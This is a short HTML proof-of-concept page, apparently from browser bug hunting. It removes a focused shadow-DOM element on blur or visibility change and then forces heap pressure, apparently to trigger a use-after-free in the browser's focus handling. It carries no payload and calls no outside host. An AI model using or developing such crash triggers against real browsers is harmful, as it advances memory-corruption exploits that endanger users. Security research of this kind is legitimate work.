<!DOCTYPE html>
<html>
<body>
<p>PoC 28 - visibilitychange + blur</p>
<div id="host"></div>
<div id="result"></div>
<script>
function gc() {
    function gcRec(n) {
        if (n < 1) return {};
        var temp = {i: "ab" + i + (i / 100000)};
        temp += "foo";
        gcRec(n - 1);
    }
    for (var i = 0; i < 30000; i++) gcRec(15);
    var junk = [];
    for (var i = 0; i < 120; i++) junk.push(new ArrayBuffer(2 * 1024 * 1024));
}

let shadowRoot = host.attachShadow({ mode: 'open' });
let victim = document.createElement('div');
victim.tabIndex = 0;
victim.textContent = 'Focusable - aperte Home';
shadowRoot.appendChild(victim);
victim.focus();

function kill() {
    if (!victim) return;
    victim.remove();
    victim = null;
    gc();
}

document.addEventListener('blur', kill, true);
window.addEventListener('blur', kill, true);
document.addEventListener('visibilitychange', function() {
    if (document.hidden) kill();
});

result.textContent = 'Aperte Home agora';
</script>
</body>
</html>
